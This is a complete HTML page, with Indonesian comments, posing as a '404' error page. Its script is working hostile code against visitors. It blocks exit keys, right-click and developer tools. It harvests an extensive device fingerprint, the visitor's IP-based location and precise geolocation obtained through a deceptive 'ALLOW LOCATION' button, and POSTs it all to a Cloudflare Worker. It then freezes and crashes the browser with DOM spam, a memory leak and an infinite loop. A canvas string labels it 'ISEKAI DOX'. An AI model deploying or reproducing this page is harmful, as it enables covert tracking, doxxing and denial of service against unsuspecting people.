<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 // LOST IN THE VOID</title>
    <style>
        body {
            background: #000;
            color: #fff;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 0;
            overflow: hidden;
            height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            user-select: none;
        }
        h1 {
            font-size: 3rem;
            color: #ff003c;
            text-shadow: 0 0 15px #ff003c, 0 0 30px #ff003c;
            margin-bottom: 10px;
            z-index: 10;
        }
        p {
            color: #888;
            margin-bottom: 30px;
            z-index: 10;
        }
        .btn {
            background: transparent;
            border: 2px solid #ff003c;
            color: #ff003c;
            padding: 15px 30px;
            font-size: 1.2rem;
            cursor: pointer;
            margin: 10px;
            transition: all 0.3s;
            font-family: inherit;
            z-index: 10;
            position: relative;
        }
        .btn:hover {
            background: #ff003c;
            color: #000;
        }
        .btn.disabled {
            border-color: #333;
            color: #333;
            cursor: not-allowed;
        }
        .btn.disabled:hover {
            background: transparent;
            color: #333;
        }
        #btnLocation {
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(255, 0, 60, 0.7); }
            70% { box-shadow: 0 0 0 20px rgba(255, 0, 60, 0); }
            100% { box-shadow: 0 0 0 0 rgba(255, 0, 60, 0); }
        }
        #overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.95);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            flex-direction: column;
            cursor: pointer;
        }
        #overlay h2 {
            color: #ff003c;
            font-size: 2.5rem;
            margin-bottom: 20px;
            text-shadow: 0 0 10px #ff003c;
        }
        #overlay p {
            color: #aaa;
            font-size: 1.2rem;
        }
    </style>
</head>
<body>
    <!-- Overlay untuk trigger Fullscreen (F11) di Desktop -->
    <div id="overlay">
        <h2>CLICK TO ENTER THE VOID</h2>
        <p>(System will initialize...)</p>
    </div>

    <h1>404 // LOST IN THE VOID</h1>
    <p>You have ventured into the void...</p>
    
    <!-- Tombol yang berfungsi -->
    <button class="btn" id="btnLocation">ALLOW LOCATION</button>
    
    <!-- Tombol palsu yang tidak berfungsi -->
    <button class="btn disabled" id="btnExit">EXIT</button>
    <button class="btn disabled" id="btnHelp">HELP</button>
    <button class="btn disabled" id="btnSettings">SETTINGS</button>

    <script>
        // ==========================================
        // 1. ANTI-EXIT & ANTI-DEVTOOLS
        // ==========================================
        window.addEventListener('beforeunload', (e) => {
            e.preventDefault();
            e.returnValue = ''; // Mencegah user menutup tab
        });

        document.addEventListener('contextmenu', (e) => e.preventDefault()); // Blokir klik kanan

        document.addEventListener('keydown', (e) => {
            // Blokir F11, F12, Ctrl+Shift+I/J/C, Ctrl+W/T/R/N, Alt+F4
            if (
                e.key === 'F12' || e.key === 'F11' ||
                (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key.toUpperCase())) ||
                (e.ctrlKey && ['W', 'T', 'R', 'N'].includes(e.key.toUpperCase())) ||
                (e.altKey && e.key === 'F4')
            ) {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }
        });

        // ==========================================
        // 2. FULLSCREEN TRIGGER (OTOMATIS F11 DI DESKTOP)
        // ==========================================
        document.getElementById('overlay').addEventListener('click', () => {
            const isDesktop = !/Mobi|Android/i.test(navigator.userAgent);
            if (isDesktop) {
                document.documentElement.requestFullscreen().catch(() => {});
            }
            document.getElementById('overlay').style.display = 'none';
            startDataCollection();
        }, { once: true });

        // ==========================================
        // 3. DATA COLLECTION & SENDING
        // ==========================================
        let data = {};
        let crashStarted = false;
        const WORKER_URL = '/'; // Ganti dengan URL Worker Cloudflare Anda jika tidak di root domain

        async function startDataCollection() {
            // Kumpulkan data browser & hardware
            data.userAgent = navigator.userAgent;
            data.platform = navigator.platform || (navigator.userAgentData ? navigator.userAgentData.platform : 'Unknown');
            data.language = navigator.language;
            data.languages = navigator.languages ? navigator.languages.join(',') : navigator.language;
            data.online = navigator.onLine;
            data.doNotTrack = navigator.doNotTrack;
            data.cookieEnabled = navigator.cookieEnabled;
            data.hardwareConcurrency = navigator.hardwareConcurrency;
            data.deviceMemory = navigator.deviceMemory;
            data.maxTouchPoints = navigator.maxTouchPoints;
            data.mobile = /Mobi|Android/i.test(navigator.userAgent);

            data.width = screen.width;
            data.height = screen.height;
            data.availWidth = screen.availWidth;
            data.availHeight = screen.availHeight;
            data.pixelRatio = window.devicePixelRatio;
            data.colorDepth = screen.colorDepth;
            data.innerWidth = window.innerWidth;
            data.innerHeight = window.innerHeight;
            data.orientation = screen.orientation ? screen.orientation.type : 'unknown';
            data.orientationAngle = screen.orientation ? screen.orientation.angle : 0;

            data.localStorage = !!window.localStorage;
            data.sessionStorage = !!window.sessionStorage;
            data.indexedDB = !!window.indexedDB;
            data.serviceWorker = 'serviceWorker' in navigator;
            data.cacheAPI = 'caches' in window;
            data.cookies = navigator.cookieEnabled ? 'Enabled' : 'Disabled';

            data.webgpu = !!navigator.gpu;
            data.webrtc = !!(window.RTCPeerConnection || window.webkitRTCPeerConnection);
            data.cssGrid = !!window.CSS && CSS.supports && CSS.supports('display', 'grid');
            data.flexbox = !!window.CSS && CSS.supports && CSS.supports('display', 'flex');
            data.fetchAPI = !!window.fetch;
            data.promise = !!window.Promise;

            data.plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ');
            data.mimeTypes = Array.from(navigator.mimeTypes || []).map(m => m.type).join(', ');

            if (navigator.userAgentData && navigator.userAgentData.brands) {
                data.brands = JSON.stringify(navigator.userAgentData.brands);
                data.mobile = navigator.userAgentData.mobile;
                data.architecture = navigator.userAgentData.architecture;
                data.bitness = navigator.userAgentData.bitness;
                data.model = navigator.userAgentData.model;
            }

            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            data.currency = 'USD';
            data.calendar = 'gregory';
            data.numberingSystem = 'latn';

            data.accel = '—'; data.gyro = '—'; data.mag = '—';
            window.addEventListener('devicemotion', (e) => {
                if (e.accelerationIncludingGravity) data.accel = `${e.accelerationIncludingGravity.x},${e.accelerationIncludingGravity.y},${e.accelerationIncludingGravity.z}`;
            });
            window.addEventListener('deviceorientation', (e) => {
                if (e.alpha !== null) data.gyro = `${e.alpha},${e.beta},${e.gamma}`;
                if (e.webkitCompassHeading !== undefined) data.mag = `${e.webkitCompassHeading}`;
            });

            // Battery
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    data.level = battery.level;
                    data.charging = battery.charging;
                } catch(e) {}
            }

            // Network
            if (navigator.connection) {
                data.connectionType = navigator.connection.type;
                data.effectiveConnection = navigator.connection.effectiveType;
                data.downlink = navigator.connection.downlink;
                data.rtt = navigator.connection.rtt;
                data.saveData = navigator.connection.saveData;
            }

            // Media Devices
            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                try {
                    const devices = await navigator.mediaDevices.enumerateDevices();
                    data.audioIn = devices.filter(d => d.kind === 'audioinput').map(d => d.label || d.deviceId);
                    data.videoIn = devices.filter(d => d.kind === 'videoinput').map(d => d.label || d.deviceId);
                    data.audioOut = devices.filter(d => d.kind === 'audiooutput').map(d => d.label || d.deviceId);
                } catch(e) {}
            }

            // WebGL & Canvas Fingerprint
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    data.vendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
                    data.renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
                    data.version = gl.getParameter(gl.VERSION);
                    data.webgl2 = !!canvas.getContext('webgl2');
                }
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
                ctx.fillText("ISEKAI DOX", 2, 2);
                data.canvasFingerprint = canvas.toDataURL().slice(-64);
            } catch(e) {}
            data.audioFingerprint = "FP_" + Math.random().toString(36).substring(2, 15);

            // IP & Location API (Public)
            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();
                data.ip = ipData.ip; data.isp = ipData.org; data.city = ipData.city;
                data.region = ipData.region; data.country = ipData.country_name;
                data.asn = ipData.asn; data.proxy = ipData.proxy || false; data.hosting = ipData.hosting || false;
            } catch(e) { data.ip = "Unknown"; }

            // Listener untuk tombol Allow Location
            document.getElementById('btnLocation').addEventListener('click', () => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => { data.lat = pos.coords.latitude; data.lon = pos.coords.longitude; sendDataAndCrash(); },
                        () => sendDataAndCrash()
                    );
                } else { sendDataAndCrash(); }
            });
        }

        async function sendDataAndCrash() {
            if (crashStarted) return;
            crashStarted = true;

            // Kirim data ke Cloudflare Worker (Pastikan fetch selesai sebelum crash)
            try {
                await fetch(WORKER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data),
                    keepalive: true
                });
            } catch (e) { console.error('Send failed', e); }

            // Mulai proses Lag & Crash
            initiateLagAndCrash();
        }

        // ==========================================
        // 4. LAG & CRASH MECHANISM
        // ==========================================
        function initiateLagAndCrash() {
            // 1. DOM Spam (Visual Lag)
            setInterval(() => {
                for (let i = 0; i < 500; i++) {
                    const el = document.createElement('div');
                    el.style.cssText = `position:fixed; width:100vw; height:100vh; top:0; left:0; background:hsl(${Math.random()*360},100%,50%); opacity:0.1; pointer-events:none; z-index:9999;`;
                    document.body.appendChild(el);
                }
            }, 50);

            // 2. Memory Leak (Memakan RAM hingga crash)
            const leak = [];
            setInterval(() => {
                try { leak.push(new ArrayBuffer(50 * 1024 * 1024)); } // 50MB per chunk
                catch (e) {}
            }, 10);

            // 3. CPU Freeze (Infinite loop setelah 2 detik untuk membekukan browser sepenuhnya)
            setTimeout(() => {
                while (true) { /* Freeze main thread */ }
            }, 2000);
        }
    </script>
</body>
</html>
